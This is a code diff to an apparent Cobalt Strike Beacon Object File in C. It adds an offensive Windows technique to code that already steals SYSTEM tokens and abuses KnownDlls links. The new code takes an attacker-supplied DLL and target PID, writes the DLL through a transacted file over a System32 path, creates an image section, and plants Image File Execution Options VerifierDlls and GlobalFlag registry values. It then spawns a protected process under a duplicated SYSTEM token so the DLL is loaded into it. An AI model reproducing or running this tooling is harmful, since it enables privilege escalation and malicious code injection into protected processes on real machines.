@@ -27,6 +27,7 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 
 		INT			NamLen = 0;
 		INT			DllLen = 0;
+		ULONG			PidNum = 0;
 
 		HANDLE			SysTok = NULL;
 		HANDLE			LclTok = NULL;
@@ -34,6 +35,7 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		LPWSTR			DllNam = NULL;
 		LPWSTR			LnkNam = NULL;
 		LPWSTR			RegNam = NULL;
+		LPVOID			DllBuf = NULL;
 
 		LPWSTR			KwnPth = NULL;
 		LPWSTR			LnkPth = NULL;
@@ -46,6 +48,15 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		HANDLE			LnkObj = NULL;
 		HANDLE			LnkTwo = NULL;
 		HANDLE			MgrPtr = NULL;
+		HANDLE			FlePtr = NULL;
+		HANDLE			SecPtr = NULL;
+		HANDLE			DupUsr = NULL;
+
+		PIMAGE_DOS_HEADER	DosHdr = NULL;
+		PIMAGE_NT_HEADERS	NthHdr = NULL;
+		PIMAGE_SECTION_HEADER	SecHdr = NULL;
+
+		HKEY			RegKey = NULL;
 
 		PVOID			NtlMod = NULL;
 		PVOID			K32Mod = NULL;
@@ -81,7 +92,9 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		ApiTbl.NtCreateDirectoryObjectEx    = PeGetFuncEat( NtlMod, H_API_NTCREATEDIRECTORYOBJECTEX );
 		ApiTbl.SetKernelObjectSecurity      = PeGetFuncEat( AdvMod, H_API_SETKERNELOBJECTSECURITY );
 		ApiTbl.NtQueryInformationToken      = PeGetFuncEat( NtlMod, H_API_NTQUERYINFORMATIONTOKEN );
+		ApiTbl.CreateProcessWithTokenW      = PeGetFuncEat( AdvMod, H_API_CREATEPROCESSWITHTOKENW );
 		ApiTbl.ConvertStringSidToSidA       = PeGetFuncEat( AdvMod, H_API_CONVERTSTRINGSIDTOSIDA );
+		ApiTbl.CreateFileTransactedW        = PeGetFuncEat( K32Mod, H_API_CREATEFILETRANSACTEDW );
 		ApiTbl.RtlInitUnicodeString         = PeGetFuncEat( NtlMod, H_API_RTLINITUNICODESTRING );
 		ApiTbl.NtCreateTransaction          = PeGetFuncEat( NtlMod, H_API_NTCREATETRANSACTION );
 		ApiTbl.NtOpenProcessToken           = PeGetFuncEat( NtlMod, H_API_NTOPENPROCESSTOKEN );
@@ -90,25 +103,31 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		ApiTbl.NtGetNextProcess             = PeGetFuncEat( NtlMod, H_API_NTGETNEXTPROCESS );
 		ApiTbl.DuplicateTokenEx             = PeGetFuncEat( AdvMod, H_API_DUPLICATETOKENEX );
 		ApiTbl.DefineDosDeviceW             = PeGetFuncEat( K32Mod, H_API_DEFINEDOSDEVICEW );
+		ApiTbl.RegCreateKeyExW              = PeGetFuncEat( AdvMod, H_API_REGCREATEKEYEXW );
 		ApiTbl.NtCreateSection              = PeGetFuncEat( NtlMod, H_API_NTCREATESECTION );
+		ApiTbl.RegSetValueExW               = PeGetFuncEat( AdvMod, H_API_REGSETVALUEEXW );
 		ApiTbl.SetThreadToken               = PeGetFuncEat( AdvMod, H_API_SETTHREADTOKEN );
 		ApiTbl.RtlEqualSid                  = PeGetFuncEat( NtlMod, H_API_RTLEQUALSID );
 		ApiTbl.LocalAlloc                   = PeGetFuncEat( K32Mod, H_API_LOCALALLOC );
 		ApiTbl._vsnprintf                   = PeGetFuncEat( NtlMod, H_API_VSNPRINTF );
+		ApiTbl.WriteFile                    = PeGetFuncEat( K32Mod, H_API_WRITEFILE );
 		ApiTbl.LocalFree                    = PeGetFuncEat( K32Mod, H_API_LOCALFREE );
 		ApiTbl.NtClose                      = PeGetFuncEat( NtlMod, H_API_NTCLOSE );
+		ApiTbl.Sleep                        = PeGetFuncEat( K32Mod, H_API_SLEEP );
 
 		BeaconApi->BeaconDataParse( &Parser, Argv, Argc );
 		DllNam = BeaconApi->BeaconDataExtract( &Parser, &NamLen );
 		LnkNam = BeaconApi->BeaconDataExtract( &Parser, NULL );
 		RegNam = BeaconApi->BeaconDataExtract( &Parser, NULL );
+		DllBuf = BeaconApi->BeaconDataExtract( &Parser, &DllLen );
+		PidNum = BeaconApi->BeaconDataInt( &Parser );
 
-		KwnPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\GLOBAL??\\KnownDlls\\%ls" ) ), DllNam );
-		LnkPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\GLOBAL??\\KnownDlls\\%ls" ) ), LnkNam );
-		GblPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "GLOBALROOT\\KnownDlls\\%ls" ) ), DllNam );
-		ObjPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\KernelObjects\\%ls" ) ), DllNam );
-		DskPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "C:\\Windows\\System32\\%ls" ) ), DllNam );
-		RegPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%ls" ) ), RegNam );
+		KwnPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\GLOBAL??\\KnownDlls\\%ls\0" ) ), DllNam );
+		LnkPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\GLOBAL??\\KnownDlls\\%ls\0" ) ), LnkNam );
+		GblPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "GLOBALROOT\\KnownDlls\\%ls\0" ) ), DllNam );
+		ObjPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\KernelObjects\\%ls\0" ) ), DllNam );
+		DskPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "C:\\Windows\\System32\\%ls\0" ) ), DllNam );
+		RegPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%ls\0" ) ), RegNam );
 
 		SysTok = TokenGetTokenWithSidAndPrivilegeCount( &ApiTbl, C_PTR( G_SYM( "S-1-5-18" ) ), 0x16 );
 		LclTok = TokenGetTokenWithSidAndPrivilegeCount( &ApiTbl, C_PTR( G_SYM( "S-1-5-19" ) ), 0x00 );
@@ -183,6 +202,94 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create a transaction." ) ) );
 							goto Leave;
 						};
+
+						if ( ( FlePtr = ApiTbl.CreateFileTransactedW( 
+										DskPth, 
+										GENERIC_READ | GENERIC_WRITE, 
+										0, 
+										NULL, 
+										CREATE_ALWAYS, 
+										0, 
+										NULL, 
+										MgrPtr, 
+										NULL, 
+										NULL ) 
+						) == INVALID_HANDLE_VALUE ) {
+							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create transacted file." ) ) );
+							goto Leave;
+						};
+
+						DosHdr = C_PTR( DllBuf );
+						NthHdr = C_PTR( U_PTR( DosHdr ) + DosHdr->e_lfanew );
+						NthHdr->FileHeader.NumberOfSymbols = PidNum;
+
+						if ( ! ApiTbl.WriteFile( FlePtr, DllBuf, DllLen, &( DWORD ){ 0x0 }, NULL ) ) {
+							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not write to transacted file." ) ) );
+							goto Leave;
+						};
+
+						RtlSecureZeroMemory( &UniOne, sizeof( UniOne ) );
+						RtlSecureZeroMemory( &ObjAtt, sizeof( ObjAtt ) );
+
+						ApiTbl.RtlInitUnicodeString( &UniOne, ObjPth );
+						InitializeObjectAttributes( &ObjAtt, &UniOne, 0x40, NULL, NULL );
+
+						if ( !( ApiTbl.NtCreateSection( &SecPtr, SECTION_ALL_ACCESS, &ObjAtt, NULL, PAGE_READONLY, SEC_IMAGE, FlePtr ) >= 0 ) ) {
+							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create a section." ) ) );
+							goto Leave;
+						};
+
+						if ( ApiTbl.RegCreateKeyExW( 
+							HKEY_LOCAL_MACHINE, 
+							RegPth, 
+							0, 
+							NULL, 
+							REG_OPTION_VOLATILE, 
+							KEY_ALL_ACCESS, 
+							NULL, 
+							&RegKey, 
+							&( DWORD ){ 0 } ) != 0 
+						) {
+							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create registry key." ) ) );
+							goto Leave;
+						};
+
+						if ( ApiTbl.RegSetValueExW( RegKey, C_PTR( G_SYM( L"VerifierDlls" ) ), 0, REG_SZ, C_PTR( DllNam ), NamLen ) ) {
+							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create verifier dll." ) ) );
+							goto Leave;
+						};
+
+						if ( ApiTbl.RegSetValueExW( RegKey, C_PTR( G_SYM( L"GlobalFlag" ) ), 0, REG_DWORD, C_PTR( &( DWORD ){ 0x100 } ), sizeof( DWORD ) ) ) {
+							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not create global flag." ) ) );
+							goto Leave;
+						};
+
+						if ( ! ApiTbl.DuplicateTokenEx( SysTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DupUsr ) ) {
+							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not duplicate token." ) ) );
+							goto Leave;
+						};
+
+						StartW.cb = sizeof( StartW );
+
+						if ( ApiTbl.CreateProcessWithTokenW(
+								DupUsr,
+								0,
+								NULL,
+								RegNam,
+								CREATE_PROTECTED_PROCESS,
+								NULL,
+								NULL,
+								&StartW,
+								&ProcIn
+						) )
+						{
+							ApiTbl.Sleep( 5000 );
+							ApiTbl.NtClose( ProcIn.hProcess );
+							ApiTbl.NtClose( ProcIn.hThread );
+						} else {
+							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( ":(" ) ) );
+							goto Leave;
+						}
 					} else {
 						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not impersonate system." ) ) );
 						goto Leave;
@@ -218,6 +325,20 @@ Leave:
 		if ( MgrPtr != NULL ) {
 			ApiTbl.NtClose( MgrPtr );
 		};
+		if ( FlePtr != NULL ) {
+			ApiTbl.NtClose( FlePtr );
+		};
+		if ( SecPtr != NULL ) {
+			ApiTbl.NtClose( SecPtr );
+		};
+		if ( RegKey != NULL ) {
+			/* RegCloseKey */
+		};
+		if ( DupUsr != NULL ) {
+			ApiTbl.NtClose( DupUsr );
+		};
+
+		/* Clsoe Reg Key! */
 
 		if ( KwnPth != NULL ) {
 			ApiTbl.LocalFree( KwnPth );
